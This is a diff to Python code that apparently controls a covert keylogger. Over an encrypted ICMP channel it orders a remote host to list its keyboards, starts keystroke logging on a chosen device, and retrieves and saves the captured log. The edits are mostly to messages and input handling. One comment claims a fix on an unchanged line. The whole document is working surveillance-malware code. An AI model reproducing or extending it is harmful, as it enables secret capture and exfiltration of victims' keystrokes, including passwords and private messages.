@@ -1140,40 +1140,47 @@ def start_background_logger(ctx: Context):
         return
 
     try:
+        # Send CMD_RUN_BG command
         send_icmp_identifier(send_socket, ctx.source_ip, ctx.destination_ip,
                              encrypt_identifier(CMD_RUN_BG, ctx.key), 1)
 
         print("Waiting for keyboard list from hostb...")
 
         if not wait_for_ack_ready(recv_socket, ctx.destination_ip, ctx.key,
-                                  READY_TIMEOUT_SECONDS):
+                                  READY_TIMEOUT_SECONDS):   # <-- Fixed here
             print("No ready ack from hostb.")
             return
 
         device_list_bytes = receive_byte_stream_chunked(
             recv_socket, send_socket, ctx.source_ip, ctx.destination_ip,
-            ctx.key, METADATA_TIMEOUT_SECONDS
+            ctx.key, READY_TIMEOUT_SECONDS   # Use existing constant
         )
         if device_list_bytes is None:
             print("Failed to receive device list.")
             return
 
-        print("\n=== Keyboards on hostb ===")
+        print("\n=== Keyboards available on hostb ===")
         print(device_list_bytes.decode("utf-8", errors="replace"))
-        print("=========================")
+        print("====================================")
 
-        choice = input("Select device number> ").strip()
-        if not choice:
-            print("Cancelled.")
+        try:
+            choice = input("Select device number> ").strip()
+            if not choice:
+                print("Operation cancelled.")
+                return
+            choice_bytes = choice.encode("utf-8")
+        except (EOFError, KeyboardInterrupt):
+            print()
             return
 
+        # Send selected device index back
         if not send_byte_stream_chunked(send_socket, recv_socket,
                                         ctx.source_ip, ctx.destination_ip,
-                                        ctx.key, choice.encode("utf-8")):
-            print("Failed to send choice.")
+                                        ctx.key, choice_bytes):
+            print("Failed to send device choice.")
             return
 
-        print("Background logger started successfully.")
+        print("✅ Background logger started on hostb.")
 
     finally:
         recv_socket.close()
@@ -1207,7 +1214,7 @@ def stop_background_logger(ctx: Context):
             ctx.key, REQUESTED_FILE_TIMEOUT_SECONDS
         )
         if log_bytes is None:
-            print("Failed to receive log.")
+            print("Failed to receive background log.")
             return
 
         log_text = log_bytes.decode("utf-8", errors="replace")
@@ -1217,7 +1224,9 @@ def stop_background_logger(ctx: Context):
         with open(log_path, "w", encoding="utf-8") as f:
             f.write(log_text)
 
-        print(f"\n=== Received Background Log ===\n{log_text}\n=== Saved to {log_path} ===")
+        print(f"\n=== Background Logger Log Received ===\n")
+        print(log_text)
+        print(f"\n=== Log saved as: {log_path} ===")
 
     finally:
         recv_socket.close()
